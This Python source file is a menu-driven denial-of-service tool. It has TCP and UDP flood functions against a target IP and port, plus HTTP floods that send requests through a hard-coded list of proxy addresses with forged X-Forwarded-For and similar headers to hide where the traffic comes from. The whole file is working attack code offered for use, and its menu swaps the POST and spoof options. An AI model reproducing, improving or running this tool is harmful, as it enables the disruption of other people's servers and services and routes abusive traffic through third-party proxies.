import socket
import random
import time
import threading
from colorama import Fore, init
import requests
from urllib.parse import urlparse

# Initialize colorama
init(autoreset=True)

# List of user-agents for anonymity
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/99.0.2",
    # Add more user-agents as needed
]

# Secure and anonymize the proxy list (store it in a secure location)
# Define a list of proxy tuples (host, port)
proxies = [
    # Replace with secure and anonymous proxy details
    ("185.64.208.168", 53281),
    ("125.60.148.161", 111),
    ("137.188.108.18", 4000),
    ("64.225.4.17", 1005),
    ("104.248.90.212", 80),
    ("117.54.114.97", 80),
    ("117.54.114.33", 80),
    ("185.139.56.133", 6961),
    ("35.240.156.235",8070),
    ("200.25.254.193", 54240),
    ("34.142.51.21", 443),
    ("196.20.125.129", 8083),
    ("61.72.254.69", 8061),
    ("167.71.5.83", 8080),
    ("23.122.184.9", 8888),
    ("190.121.151.207", 80),
    ("154.58.202.47", 1337),
    ("185.148.86.199", 8080),
    ("113.161.131.43", 80),
    ("188.166.56.246", 80),
    ("213.33.2.28", 80),
    ("8.219.97.248", 80),
    ("146.19.106.109", 3218),
    ("213.33.126.130", 80),
    ("20.111.54.16", 8123),
    ("32.223.6.94", 80),
    ("50.228.83.226", 80)
]

# Define a function to fetch proxy list securely (if needed)
def fetch_proxies():
    try:
        response = requests.get("https://example.com/secure-proxy-list")
        if response.status_code == 200:
            proxy_list = response.text.split("\n")
            # Process and validate the proxy list
            return proxy_list
    except Exception as e:
        print("Error fetching proxy list:", e)
    return []

# Function to generate a spoofed IP address
def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assembled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assembled

# Function for DDoS TCP Flood
def ddos_tcp_flood(ip, port):
    # Implement security checks and input validation here
    packets = int(input('[+] Packets per Thread: '))
    threads = int(input('[+] Number of Threads: '))

    def start_attack():
        hh = random._urandom(10)
        xx = int(0)
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.send(hh)
                for i in range(packets):
                    s.send(hh)
                xx += 1
                print('Attacking ' + ip + ' | Sent: ' + str(xx))
            except:
                s.close()
                print('Done')

    for x in range(threads):
        thread = threading.Thread(target=start_attack)
        thread.start()

# Function for DDoS UDP Flood
def ddos_udp_flood(ip, port):
    length = int(input('Duration (in seconds): '))
    num_threads = int(input('Number of Threads: '))

    def UDPFlood():
        randport = False
        duration = time.time() + length
        print(f'UDP Flood: {ip}:{port} for {length} seconds with {num_threads} threads')

        # Create a list to store thread objects
        threads = []

        for _ in range(num_threads):
            thread = threading.Thread(target=attack, args=(ip, port, randport, duration))
            threads.append(thread)
            thread.start()

        # Wait for all threads to complete
        for thread in threads:
            thread.join()

        print('DONE')

    def attack(ip, port, randport, duration):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(65507)

        while time.time() < duration:
            target_port = random.randint(1, 65535) if randport else port
            try:
                sock.sendto(bytes, (ip, target_port))
                print(f'Sending to {ip}:{target_port}')
            except:
                break

        sock.close()

    UDPFlood()

# Function for HTTPS-SPOOF Attack
def https_spoof_attack(url, timer):
    headers = {
        "User-Agent": random.choice(user_agents),  # Select a random user-agent for anonymity
        "X-Forwarded-Proto": "http",  # Spoof the HTTP protocol
        "X-Forwarded-Host": urlparse(url).netloc,
        "Via": spoofer(),
        "Client-IP": spoofer(),
        "X-Forwarded-For": spoofer(),
        "Real-IP": spoofer(),
        "Connection": "Keep-Alive"
    }

    # Secure and anonymize the proxy list (store it in a secure location)
    # Define a list of proxy dictionaries (scheme, host, port)
    

    proxies = [
    {"http": "185.64.208.168:53281"},
    {"http": "125.60.148.161:111"},
    {"http":"137.188.108.18:4000"},
    {"http":"64.225.4.17:1005"},
    {"http":"104.248.90.212:80"},
    {"http":"117.54.114.97:80"},
    {"http":"117.54.114.33:80"},
    {"http":"185.139.56.133:6961"},
    {"http":"35.240.156.235:8070"},
    {"http":"200.25.254.193:54240"},
    {"http":"34.142.51.21:443"},
    {"http":"196.20.125.129:8083"},
    {"http":"61.72.254.69:8061"},
    {"http":"167.71.5.83:8080"},
    {"http":"23.122.184.9:8888"},
    {"http":"190.121.151.207:80"},
    {"http":"154.58.202.47:1337"},
    {"http":"185.148.86.199:8080"},
    {"http":"113.161.131.43:80"},
    {"http":"188.166.56.246:80"},
    {"http":"213.33.2.28:80"},
    {"http":"8.219.97.248:80"},
    {"http":"146.19.106.109:3218"},
    {"http":"213.33.126.130:80"},
    {"http":"20.111.54.16:8123"},
    {"http":"32.223.6.94:80"},
    {"http":"50.228.83.226:80"}
    # Add more proxy details as needed
   ]

    timeout = time.time() + int(timer)

    while time.time() < timeout:
        try:
            proxy = random.choice(proxies)
            response = requests.get(url, headers=headers, proxies=proxy)
            print(f"Sent request via proxy: {proxy['http']} - Status Code: {response.status_code}")
        except Exception as e:
            print(f"Failed to send request: {str(e)}")

def layer7_post_attack(url, timer):
    headers = {
        "User-Agent": random.choice(user_agents),  # Select a random user-agent for anonymity
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/json",
    }

    timeout = time.time() + int(timer)
    num_requests = int(input('[+] Number of Requests: '))  # Input the number of requests

    def send_request():
        try:
            response = requests.post(url, headers=headers)
            if response.status_code == 200:
                print(f"Sent POST request to {url} - Status Code: {response.status_code}")
            else:
                print(f"Request failed with status code: {response.status_code}")
        except Exception as e:
            print(f"Failed to send POST request: {str(e)}")

    while time.time() < timeout:
        for _ in range(num_requests):
            send_request()

            
# Main method panel
def main_panel():
    home_banner = """
  _____ ______ _____ _____ _______  _______  __    ______     ____  ____       _____
 / ___// ____/  ____/ ___//  _/  | / / __ \/ /   / ____/    / __ \/ __ \____ / ___/
 \__ \/ /   /  / __ \__ \ / // /|_/ / /_/ / /   / __/______/ / / / / / / __ \\__ \ 
___/ / /___/  /_/ /___/ // // /  / / / __/ /___/ /__/_____/ /_/ / /_/ / /_/ /__/ / 
/____/\____/\____//____/___/_/  /_/_/   /_____/_____/    /_____/_____/\____/____/
    """
    layer4_banner = '''
  _           __   ________ _____        _  _   
| |        /\\ \   / /  ____|  __ \      | || |  
| |       /  \\ \_/ /| |__  | |__) |_____| || |_ 
| |      / /\ \\   / |  __| |  _  /______|__   _|
| |____ / ____ \| | | |____| | \ \         | |  
|______/_/    \_\_| |______|_|  \_\        |_|
'''
    layer7_banner = '''
 ______     __   __   ______   ______   __   __   __   __   ______   ______   __   __    
/\  ___\   /\ -.\ \ /\  == \ /\  __ \ /\ -.\ \ /\ \ /\ \ /\ \ /\  == \ /\  __ \ /\ -.\ \   
\ \  __\   \ \ \\ \ \\ \  _-/ \ \  __ \\ \ \\ \\ \ \\ \ \ \\ \ \\  __< \ \  __ \\ \ \\ \\ \  
 \ \_____\  \ \__  _\\ \_\    \ \_\ \_\\ \_\ \_\\ \_\ \_\\ \_\ \_\ \_\\ \_\ \_\\ \_\ \_\\ \_\ 
  \/_____/   \/_/ \/_/ \/_/     \/_/\/_/ \/_/\/_/ \/_/ \/_/\/_/ /_/ \/_/\/_/ \/_/ \/_/ \/_/ 
    '''
    while True:
        if 'layer4_choice' not in locals():
            print(Fore.RED + home_banner)
        else:
            print(Fore.RED + layer4_banner)

        print(Fore.RED + "[1] Layer 4")
        print(Fore.RED + "[2] Layer 7 (HTTPS-SPOOF)")  # Add an option for Layer 7
        print(Fore.RED + "[3] Exit")
        choice = input(Fore.WHITE + "Select Layer: ")

        if choice == '1':
            if 'layer4_choice' not in locals():
                print(Fore.RED + layer4_banner)
            print(Fore.RED + "[1] (TCP)")
            print(Fore.RED + "[2] (UDP)")
            layer4_choice = input(Fore.WHITE + "Choose Method: ")

            if layer4_choice == '1':
                ip = input('[+] Target IP: ')
                port = int(input('[+] Target Port: '))
                ddos_tcp_flood(ip, port)  # Execute Layer 4 TCP Flood
            elif layer4_choice == '2':
                ip = input(' Target IP: ')
                port = int(input(' Target Port: '))
                ddos_udp_flood(ip, port)  # Execute Layer 4 UDP Flood
            else:
                print("Invalid Layer 4 choice. Please select a valid option.")

        if choice == '2':  # Option for Layer 7
            print(Fore.RED + layer7_banner)
            print(Fore.RED + "[1] POST")
            print(Fore.RED + "[2] HTTPS-SPOOF")
            layer7_choice = input(Fore.WHITE + "Choose Layer 7 Method: ")

            if layer7_choice == '1':
                url = input('Target URL (e.g., https://example.com/): ')
                timer = input('Attack Duration (in seconds): ')
                https_spoof_attack(url, timer)
            elif layer7_choice == '2':
                url = input('Target URL (e.g., https://example.com/): ')
                timer = input('Attack Duration (in seconds): ')
                layer7_post_attack(url, timer)  # Execute Layer 7 HTTP POST Attack
            else:
                print("Invalid Layer 7 choice. Please select a valid option.")

if __name__ == "__main__":
    main_panel()
